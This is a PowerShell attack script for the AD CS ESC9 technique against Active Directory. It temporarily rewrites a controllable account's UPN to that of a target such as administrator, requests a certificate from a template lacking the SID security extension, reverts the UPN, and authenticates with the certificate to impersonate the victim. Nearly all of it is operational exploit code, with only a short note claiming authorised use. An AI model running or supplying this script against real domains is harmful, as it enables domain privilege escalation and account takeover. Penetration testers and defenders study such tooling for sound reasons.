<#
.SYNOPSIS
    AD CS ESC9 - No Security Extension + UPN Manipulation (LOLBAS).
.DESCRIPTION
    Exploits templates with CT_FLAG_NO_SECURITY_EXTENSION when you have
    GenericWrite over another account. Swaps the victim's UPN to the target,
    requests a cert (without SID extension), then reverts the UPN.
.PARAMETER CAConfig
    CA configuration string (e.g., "polaris.zsec.red\corp-DC01-CA")
.PARAMETER TemplateName
    Template with CT_FLAG_NO_SECURITY_EXTENSION set
.PARAMETER AccountToModify
    Account you have GenericWrite over (sAMAccountName)
.PARAMETER TargetUPN
    UPN of the user to impersonate
.EXAMPLE
    .\Invoke-ESC9.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "NoSecExt" -AccountToModify "svc-account" -TargetUPN "administrator@zsec.red"
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$CAConfig,
    [Parameter(Mandatory)] [string]$TemplateName,
    [Parameter(Mandatory)] [string]$AccountToModify,
    [Parameter(Mandatory)] [string]$TargetUPN,

    [string]$PFXPassword,
    [string]$OutputDir = "$env:TEMP\adcs-ops",
    [ValidateSet('Schannel','PKINIT','Both')] [string]$AuthMethod = 'Both',
    [string]$DCTarget,
    [switch]$SkipAuth,
    [switch]$SkipCleanup
)

$ErrorActionPreference = 'Stop'
if (-not $PFXPassword) { $PFXPassword = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object { [char]$_ }) }
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - ESC9 Standalone" -ForegroundColor White
Write-Host "  --------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Banner "ESC9" "No Security Extension + UPN Swap"

Write-Stage -Number 1 -Name "RECONNAISSANCE"
Write-Host "    [>] Controlled account : $AccountToModify" -ForegroundColor Gray
Write-Host "    [>] Victim UPN         : $TargetUPN" -ForegroundColor Gray

$ctx = Get-ADContext
$tpl = Get-ADObject -SearchBase $ctx.TemplateBase -Filter {cn -eq $TemplateName} `
    -Properties 'msPKI-Enrollment-Flag' -ErrorAction SilentlyContinue
$noSecExt = ($tpl.'msPKI-Enrollment-Flag' -band 0x80000) -ne 0
if ($noSecExt) {
    Write-Host "    [+] CT_FLAG_NO_SECURITY_EXTENSION confirmed" -ForegroundColor Green
} else {
    Write-Host "    [!] WARNING: CT_FLAG_NO_SECURITY_EXTENSION may not be set" -ForegroundColor Yellow
}
Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'COMPLETE'

# STAGE 2: UPN SWAP
Write-Host ""
Write-Stage -Number 2 -Name "POSITIONING - UPN Manipulation"
$targetUser = Get-ADUser -Identity $AccountToModify -Properties userPrincipalName
$originalUPN = $targetUser.userPrincipalName
Write-Host "    [>] Original UPN: $originalUPN" -ForegroundColor Gray
Write-Host "    [>] Setting UPN to: $TargetUPN" -ForegroundColor Yellow
Set-ADUser -Identity $AccountToModify -UserPrincipalName $TargetUPN
Start-Sleep -Seconds 2
Write-Host "    [+] UPN changed" -ForegroundColor Green
Write-Stage -Number 2 -Name "POSITIONING" -Status 'COMPLETE'

# STAGE 3: REQUEST
Write-Host ""
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST (no SID extension)"
$inf = New-CertRequestINF -Subject "CN=$AccountToModify" -Template $TemplateName `
    -OutFile "$OutputDir\esc9.inf" -Exportable
$result = Invoke-CertRequest -INFFile $inf -CA $CAConfig -Prefix "esc9"

# IMMEDIATELY revert UPN regardless of success
Write-Host "    [>] Reverting UPN to: $originalUPN" -ForegroundColor Yellow
if ($originalUPN) {
    Set-ADUser -Identity $AccountToModify -UserPrincipalName $originalUPN
} else {
    Set-ADUser -Identity $AccountToModify -Clear userPrincipalName
}
Write-Host "    [+] UPN reverted" -ForegroundColor Green

if (-not $result.Success) { Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'FAILED'; exit 1 }
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'COMPLETE'

Write-Host ""
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION"
Write-Host "    [i] Certificate lacks szOID_NTDS_CA_SECURITY_EXT - KDC will map by UPN" -ForegroundColor Cyan
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION" -Status 'COMPLETE'

Invoke-AuthStage -PFXFile $result.PFXFile -PFXPass $PFXPassword -DC $DCTarget

if (-not $SkipCleanup) {
    Write-Host ""
    Write-Stage -Number 6 -Name "CLEANUP"
    Write-Host "    [+] UPN already reverted in Stage 3" -ForegroundColor Green
    Write-Stage -Number 6 -Name "CLEANUP" -Status 'COMPLETE'
}

Write-Host ""
Write-Host "  Complete. Artifacts in: $OutputDir" -ForegroundColor Gray
Write-Host ""
